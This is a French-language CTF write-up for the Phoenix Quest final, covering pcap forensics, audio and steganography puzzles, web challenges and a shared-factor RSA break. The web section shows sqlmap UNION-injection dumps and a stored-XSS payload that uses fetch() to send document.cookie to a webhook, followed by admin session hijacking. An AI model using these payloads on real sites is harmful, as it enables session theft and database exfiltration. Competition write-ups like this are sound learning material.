---
title: Final Phoenix Quest - Writeups
time: 2025-01-24 18:00:00
categories: [ctf]
tags: [web,crypto,stegano,forensic,Network,misc]
image: /assets/posts/phoenix/icon.png
---

Mes writeups pour les challenges que j'ai résolu lors de la final du Phoenix Quest. 

``Forensic``  
# Headers 

![headers](/assets/posts/finalphoenix/header.png)

``File`` : [dump.pcap](/assets/posts/finalphoenix/dump.pcap) 

On nous donne un pcap à analyser. En faisant un strings sur le fichier on remarque une chaîne qui ressemble au flag vers la fin. Et ensuite un rot13 on a le flag. 

```bash 
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Forensic/Headers]
└─$ strings -a dump.pcap
<k<@
4k=@
p#GET /login.html HTTP/1.1
--SNIP--
GET /flag HTTP/1.1
Host: 10.0.2.15
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

PtB7
^`tB7
PtB7
^atB7
d*p*[
UGET /flag HTTP/1.1
Host: 10.0.2.15
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
UHTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.9
Date: Wed, 12 Feb 2025 19:39:43 GMT
Content-type: application/octet-stream
Content-Length: 37
Last-Modified: Wed, 12 Feb 2025 19:39:33 GMT
XGCDPGS{ba_4_g0hea3_13_s01k_yn_V4a93}
d*p*[
                                                                                                                                                                                                      
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Forensic/Headers]
└─$ echo "GCDPGS{ba_4_g0hea3_13_s01k_yn_V4a93}" | rot13 
TPQCTF{on_4_t0urn3_13_f01x_la_I4n93}

```
``Flag`` : `TPQCTF{on_4_t0urn3_13_f01x_la_I4n93}` 

# Enterprise Network
   
![network](/assets/posts/finalphoenix/entreprise.png)

``File`` : [network_logs.pcap](/assets/posts/finalphoenix/network_logs.pcap) 

Selon la description du défi, un employé aurais laissé le flag sur un lien qu'on doit retrouver. Dans ce genre de cas mon premier réflexe a toujours été de vérifier "pastebin" qui est très couramment utilisé pour ce genre de défi. 

```bash
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Forensic/Entreprise]
└─$ strings -a network_logs.pcap | grep -i pastebin
GET https://pastebin.com/f1G8aTBX HTTP/1.1
DNS Query for https://pastebin.com/f1G8aTBX
DNS Query for https://pastebin.com/f1G8aTBX
GET https://pastebin.com/f1G8aTBX HTTP/1.1
TDNS Query for https://pastebin.com/f1G8aTBX
                                                                                                                                                                                                      
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Forensic/Entreprise]
└─$ curl -H GET https://pastebin.com/f1G8aTBX | grep -i TPQCTF{
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0    <title>TPQCTF{1nt3rnet_1s_n0t_s0_s4f3} - Pastebin.com</title>
    <meta property="og:title" content="TPQCTF{1nt3rnet_1s_n0t_s0_s4f3} - Pastebin.com" />
            <ol class="text"><li class="li1"><div class="de1">TPQCTF{1nt3rnet_1s_n0t_s0_s4f3}</div></li></ol>        </div>
100 19903    0 19903    0     0  17001      0 --:--:--  0:00:01 --:--:-- 17040
                                                                   
```
``Flag`` : `TPQCTF{1nt3rnet_1s_n0t_s0_s4f3}` 

# Army 

![army](/assets/posts/finalphoenix/army.png)

``File`` : [signal.wav](/assets/posts/finalphoenix/signal.wav) 

On nous donne un fichier audio à analyser. En ouvrant le fichier dans ``audacity`` et en vérifiant le spectogramme on voit ceci. 

![spectogram](/assets/posts/finalphoenix/spectogram.png)

En analysant l'image, je vois des alternances assez régulières entre deux niveaux de fréquence (un niveau bas autour de 1200 Hz et un niveau haut autour de 1800 Hz). Je me suis alors alors dit que c'était peut être du binaire. Maintenant je devrais vérifier ma théorie. En prenant la fréquence basse pour un "0" et en représentant la fréquence haute comme un "1" les huits premières alternances formaient "01010100" qui décodé donne "T"( le format du flag TQCTF) ce qui a confirmé ma théorie. 

Et c'est là que mon calvaire a commencé. J'ai cherché fatigué des outils pour décoder mais rien. Je me suis finalement dit bon bro vas-y manuellement (C'etait ma plus grande erreur de la journée. J'aurais simplement dû me concentrer sur le dernier challenge crypto de 800 points qui a eu 6 solves et finir 2ème de la compétition). J'ai commencé ce challenge à 2 heures de la fin et je l'ai résolu à 18h 27 un truc de 10min de la fin. Le plus marrant dans l'histoire c'est qu'à la fin les points ne m'ont pas été accordés. 

![forensic](/assets/posts/finalphoenix/forensic.png)

Bref passons à la résolution. En suivant ce processus jusqu'à la fin (C'était vraiment compliqué), vous aurez le flag. 

![binary](/assets/posts/finalphoenix/binary.png)

``Flag`` : `TPQCTF{Bravo_Mission_canceled}` 


``Misc``  

# Welcome Players

![welcome](/assets/posts/finalphoenix/welcome.png)

``File`` : [welcome.txt](/assets/posts/finalphoenix/Welcome.txt) 

On nous donne une suite de chiffres. J'ai envoyé sur dcode et j'ai vu que c'était de l'hex. Une fois décodé on avait un binaire qui à son tour décodé nous donne le flag. 

![dcode](/assets/posts/finalphoenix/dcode.png)

```bash 
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Misc/welcomeplayer]
└─$ python         
Python 3.10.0 (default, Feb  1 2025, 10:47:22) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> bytes.fromhex("3031303130313030203031303130303030203031303130303031203031303030303131203031303130313030203031303030313130203031313131303131203031303130313131203030313130303131203031313031313030203031313030303131203030313130303030203031313031313031203030313130303131203031303131313131203031313130313030203030313130303030203031303131313131203031313130313030203031313031303030203030313130303131203031303131313131203031313031303130203031313130313031203031313031313130203030313131303031203031313031313030203030313130303131203031303131313131203031313130303030203031313031313030203030313130313030203031313131303031203030313130303131203031313130303130203031313131313031").decode("utf-8")
'01010100 01010000 01010001 01000011 01010100 01000110 01111011 01010111 00110011 01101100 01100011 00110000 01101101 00110011 01011111 01110100 00110000 01011111 01110100 01101000 00110011 01011111 01101010 01110101 01101110 00111001 01101100 00110011 01011111 01110000 01101100 00110100 01111001 00110011 01110010 01111101'
>>> print("".join(chr(int(b, 2)) for b in "01010100 01010000 01010001 01000011 01010100 01000110 01111011 01010111 00110011 01101100 01100011 00110000 01101101 00110011 01011111 01110100 00110000 01011111 01110100 01101000 00110011 01011111 01101010 01110101 01101110 00111001 01101100 00110011 01011111 01110000 01101100 00110100 01111001 00110011 01110010 01111101".split()))
TPQCTF{W3lc0m3_t0_th3_jun9l3_pl4y3r}
>>> 
```
``Flag`` : `TPQCTF{W3lc0m3_t0_th3_jun9l3_pl4y3r}`

# Dash dot dot dash

![dash](/assets/posts/finalphoenix/dash.png)

``File`` : [Message.txt](/assets/posts/finalphoenix/Message.txt) 

Le nom du défi était un grand indice. J'avais directement su que nous avons affaire à du morse. Le texte a été identifié grâce à dcode comme du base64. Une fois décodé on a le code morse qui à son tour décodé donne le flag. Voici le script pour avoir le flag directement. 

```python
import base64

MORSE_CODE_DICT = {
    '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
    '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
    '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
    '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
    '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
    '--..': 'Z', '-----': '0', '.----': '1', '..---': '2', '...--': '3',
    '....-': '4', '.....': '5', '-....': '6', '--...': '7', '---..': '8',
    '----.': '9', '.-.-.-': '.', '--..--': ',', '..--..': '?',
    '.----.': "'", '-.-.--': '!', '-..-.': '/', '-.--.': '(',
    '-.--.-': ')', '.-...': '&', '---...': ':', '-.-.-.': ';',
    '-...-': '=', '.-.-.': '+', '-....-': '-', '..--.-': '_',
    '.-..-.': '"', '...-..-': '$', '.--.-.': '@', '...---...': 'SOS'
}

def decode_base64(encoded_text):

    try:
        decoded_bytes = base64.b64decode(encoded_text)
        return decoded_bytes.decode('utf-8')
    except:
        return None

def decode_morse(morse_text):

    parts = morse_text.split(' ')
    decoded_text = ''
    
    for part in parts:
        if part == '{':
            decoded_text += '{'
        elif part == '}':
            decoded_text += '}'
        elif part in MORSE_CODE_DICT:
            decoded_text += MORSE_CODE_DICT[part]
        elif part:  # Si ce n'est pas un espace vide
            print(f"Caractère Morse inconnu: {part}")
    
    return decoded_text

def main():

    hex_data = """LSAuLS0uIC0tLi0gLS4tLiAtIC4uLS4geyAuLS4uIC4gLi4tLS4tIC0uLS4gLi4gLi4uLS0gLi0uLiAuLi0tLi0gLS0gLi4uLS0gLS4uLi4tIC4tLS4gLi4uLi0gLi0uIC4tLi4gLi4uLS0gLi4tLS4tIC4uLi0tIC0uIC4uLS0uLSAtLSAtLS0tLSAuLS4gLS4tLiAuLi4tLSB9""" 
    # Première étape : décodage base64
    base64_decoded = decode_base64(hex_data)
    if base64_decoded:
        print("Texte en Morse:", base64_decoded)
        
        # Décodage Morse
        final_text = decode_morse(base64_decoded)
        print("Message final décodé:", final_text)
    else:
        print("Erreur lors du décodage base64")

if __name__ == "__main__":
    main()

```

```bash
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Misc/Dash]
└─$ python solve.py
Texte en Morse: - .--. --.- -.-. - ..-. { .-.. . ..--.- -.-. .. ...-- .-.. ..--.- -- ...-- -....- .--. ....- .-. .-.. ...-- ..--.- ...-- -. ..--.- -- ----- .-. -.-. ...-- }
Message final décodé: TPQCTF{LE_CI3L_M3-P4RL3_3N_M0RC3}

```
``Flag`` : `TPQCTF{LE_CI3L_M3-P4RL3_3N_M0RC3}`

# Image mystère 1

![mistere](/assets/posts/finalphoenix/mistere.png)

``File`` : [dinosaure.jpg](/assets/posts/finalphoenix/dinosaure.jpg) 

J'ai d'abord commencé par envoyer l'image sur aperisolve. Et j'ai constaté qu'il y'avait déjà eu d'upload. Donc nous sommes peut être sur la bonne voix.

![aperi1](/assets/posts/finalphoenix/aperi1.png)

En descendant vers la zone ``steghide`` on a ce message : 

![aperi2](/assets/posts/finalphoenix/aperi2.png)

Donc y'a peut être un truc caché à ce niveau. Le défi ne faisant mention d'aucun mot de passe pour l'extraction alors je suis passé à ``stegseek``. Ce qui a fonctionné et j'ai pu extraire le flag 

```bash 
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Misc/imagemistere1]
└─$ stegseek dinosaure.jpg                         
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "P@ssw0rdm0h@med"  
[i] Original filename: "dino".
[i] Extracting to "dinosaure.jpg.out".

                                                                                                                                                                                                      
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Misc/imagemistere1]
└─$ cat dinosaure.jpg.out
TPQCTF{!_l0v3_B3N!N_4v3r}
```
``Flag`` : `TPQCTF{!_l0v3_B3N!N_4v3r}`


``Web``

# Rise from the Ashes

![Rise](/assets/posts/finalphoenix/Rise.png)

``Site`` : [Link](http://thephoenixquest.acxsit.com:30000/) 

On tombe sur une boutique informatique où nous pouvons rechercher des produits. Si vous faites bien attention au titre de la page vous avez un indice sur ``L'Injection SQL`` 

![indice](/assets/posts/finalphoenix/titre.png)

Comme l'indice mentionnais l'injection sql j'ai tout simplement laissé ``sqlmap`` me donner son avis. 

```bash 
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Misc/imagemistere1]
└─$ sqlmap -u "http://thephoenixquest.acxsit.com:30000/index.php?search=test" --batch --risk=3 --level=5 --dbs 
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
--SNIP--
[04:09:12] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] tpq_ctf
```
J'ai ensuite affiché les tables de la BD tpq_ctf 

```bash 
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Misc/imagemistere1]
└─$ sqlmap -u "http://thephoenixquest.acxsit.com:30000/index.php?search=test" --batch -D tpq_ctf --tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

--SNIP--

[04:11:33] [INFO] fetching tables for database: 'tpq_ctf'
Database: tpq_ctf
[2 tables]
+----------+
| products |
| secrets  |
+----------+
```
Et ensuite j'ai dumpé la table secrets et j'ai eu le flag.

```bash
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Misc/imagemistere1]
└─$ sqlmap -u "http://thephoenixquest.acxsit.com:30000/index.php?search=test" --batch -D tpq_ctf -T secrets --dump    
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=test' UNION ALL SELECT NULL,NULL,CONCAT(0x7171706a71,0x5663456e784270484677566b636b66494454514174794a4a7073697a4944634e67724878596f556a,0x716b707071)-- -
---
[04:14:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.2.27, Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[04:14:03] [INFO] fetching columns for table 'secrets' in database 'tpq_ctf'
[04:14:03] [INFO] fetching entries for table 'secrets' in database 'tpq_ctf'
Database: tpq_ctf
Table: secrets
[1 entry]
+----+---------------------------------+
| id | secret_flag                     |
+----+---------------------------------+
| 1  | TPQCTF{uni0n_4ttack_5uccessful} |
+----+---------------------------------+

```
C'est possible de faire tout ceci en une seule commande 

```bash 
(myenv-3.10) ┌──(myenv-3.10)─(kali㉿korpstation)-[~/…/Phoenix Quest/Final/Misc/imagemistere1]
└─$  sqlmap -u "http://thephoenixquest.acxsit.com:30000/index.php?search=test" --batch --risk=3 --level=5 --dbs --tables --dump-all | grep -i TPQCTF{
| 1  | TPQCTF{uni0n_4ttack_5uccessful} |

```

```Flag``` : ```TPQCTF{uni0n_4ttack_5uccessful}```

# Phoenix Restaurant

![restaurant](/assets/posts/finalphoenix/restaurant.png)

``Site`` : [Link](http://thephoenixquest.acxsit.com:30150/) 

Je lance d'abord ``gobuster``. Donc nous avons la route /admin.php qui redirige vers login pour se connecter. Noter celà, on l'utilisera plus tard. 

```bash 
                                                                                
┌──(kali㉿korpstation)-[~]
└─$ gobuster dir -u http://thephoenixquest.acxsit.com:30150/ -w /usr/share/wordlists/dirb/common.txt 

/.hta                 (Status: 403) [Size: 294]
/.git/HEAD            (Status: 200) [Size: 23]
/.htaccess            (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 294]
/admin.php            (Status: 302) [Size: 0] [--> login.php]
/assets               (Status: 301) [Size: 350] [--> http://thephoenixquest.acxsit.com:30150/assets/]
```

En visitant directement le lien du ctf on tombe sur un site où l'utilisateur donne son nom et son avis et l'admin consultera. J'ai utilisé ``burpsuite`` pour intercepter la requête. J'ai analysé la réponse et j'ai remarqué que le champ permettant de laisser un avis ne filtre  pas les caractères spéciaux. Cela signifie que si j'insères du code HTML ou JavaScript comme avis, celui-ci sera stocké dans la base de données et interprété lorsque l'admin consultera l’avis.

J'ai alors testé. 

![payload](/assets/posts/finalphoenix/payload.png) et j'ai obtenu

![vuln](/assets/posts/finalphoenix/vuln.png)

Généralement pour ce genre de défi, le flag est inséré dans le document.cookie que nous devons récupérer. J'ai alors utilisé ce payload  `', '<img src=x onerror="fetch('https://webhook.site/1bda16cc-2cd2-4d62-a50d-b6b1b19ed7c5?c='+document.cookie)">') --` que j'ai encodé en url et j'ai réussi à capturer un cookie PHPSESSID sur mon webhook. 

![webhook](/assets/posts/finalphoenix/webhook.png)
 

Vous vous rapelez du `/admin.php` je suis allé sur la page et j'ai modifié le cookie par celui que j'ai capturé. Et je me suis connecté en tant qu'admin.  Sur la page d'administration y'a un bouton pour consulter les logs.

![log](/assets/posts/finalphoenix/logs.png)

Une fois sur la page on a le flag. 

![xxs](/assets/posts/finalphoenix/xxsflag.png)

 `Flag` : `TPQCTF{stored_xxs_attack_or_weak_cr3ds_4593}`


``crypto`` 

# Les eclaireurs du roi 

![eclaireur](/assets/posts/finalphoenix/eclaireur.png) 

``File`` : [parchemin.txt](/assets/posts/finalphoenix/parchemin.txt) 

![eclaireursolve](/assets/posts/finalphoenix/solveparchemin.png) 


``Flag`` : `TPQCTF{3mper3ur_c35ar_r0m41n}`

# SMS 

![sms](/assets/posts/finalphoenix/sms.png) 

``File`` : [SMS.txt](/assets/posts/finalphoenix/SMS.txt) 

J'ai commencé par rechercher sms decode comme le nom du défi.

![seach](/assets/posts/finalphoenix/search.png) 
![decoder](/assets/posts/finalphoenix/decoder.png) 


`Flag`  : `TPQCTF{SMS_ENCODING_FUNNY_!!!}`


# Triple menace 

![triple](/assets/posts/finalphoenix/triple.png) 

``File`` : [encrypt.py](/assets/posts/finalphoenix/encrypt.py), [flag_encrypted](/assets/posts/finalphoenix/flag-encrypted.txt) 
   
Commençons par analyser le script de chiffrement: 




```python
from Cryptodome.Util.number import getPrime, bytes_to_long
import json

with open("flag.txt", "rb") as f:
    flag = f.read().strip()

p = getPrime(1024)
q = getPrime(1024)
r = getPrime(1024)

n1 = p * q
n2 = q * r
n3 = r * p

e = 65537

m = bytes_to_long(flag) 

c1 = pow(m, e, n1)
c2 = pow(m, e, n2)
c3 = pow(m, e, n3)

```

Le script effectue les opérations suivantes :

1. Génère trois grands nombres premiers : p, q et r (chacun de 1024 bits)
2. Crée trois modules RSA en multipliant des paires de nombres premiers :
   - n1 = p × q
   - n2 = q × r
   - n3 = r × p
3. Utilise un exposant public standard e = 65537
4. Chiffre le même flag trois fois avec chaque module
 
Bien que l'utilisation de multiples chiffrements RSA puisse sembler plus sécurisée, la vulnérabilité critique ici est le **partage de facteurs premiers entre les modules**. C'est une faille de sécurité fondamentale dans l'implémentation RSA.

Lorsque les modules RSA partagent des facteurs, nous pouvons facilement récupérer ces facteurs en utilisant l'algorithme du Plus Grand Commun Diviseur (PGCD). Puisque :
- n1 et n2 partagent le facteur q
- n2 et n3 partagent le facteur r
- n3 et n1 partagent le facteur p


Ma stratégie d'exploitation :

1. Trouver les facteurs premiers partagés en utilisant le calcul de PGCD
2. Utiliser les facteurs récupérés pour calculer la clé privée pour n'importe lequel des modules
3. Déchiffrer le texte chiffré en utilisant la clé privée

Voici l'implémentation de la solution :

```python
from math import gcd
from Cryptodome.Util.number import long_to_bytes

def find_prime_factors(n1, n2, n3):
    # Trouver p, q, r en utilisant le PGCD
    p = gcd(n1, n3)  # Facteur commun entre n1 et n3
    q = gcd(n1, n2)  # Facteur commun entre n1 et n2
    r = gcd(n2, n3)  # Facteur commun entre n2 et n3
    return p, q, r

def decrypt_rsa(c, e, p, q):
    n = p * q
    # Calculer l'exposant privé d
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    # Déchiffrer
    m = pow(c, d, n)
    return m

# Charger les données du fichier
import json
with open("flag-encrypted.txt", "r") as f:
    data = json.load(f)

n1 = data["n1"]
n2 = data["n2"]
n3 = data["n3"]
e = data["e"]
c1 = data["c1"]
c2 = data["c2"]
c3 = data["c3"]

# Trouver les facteurs premiers
p, q, r = find_prime_factors(n1, n2, n3)

# Déchiffrer avec la première paire (on pourrait utiliser n'importe laquelle)
m = decrypt_rsa(c1, e, p, q)

# Convertir le résultat en bytes puis en string
flag = long_to_bytes(m)
print("Flag:", flag.decode())

```

L'exécution du script de solution nous donne le flag :


`Flag`: `TPQCTF{Y0u_gu3ss_n0w_tr1pl3_rs4_1snt_tr1pl3_s3cur3}`



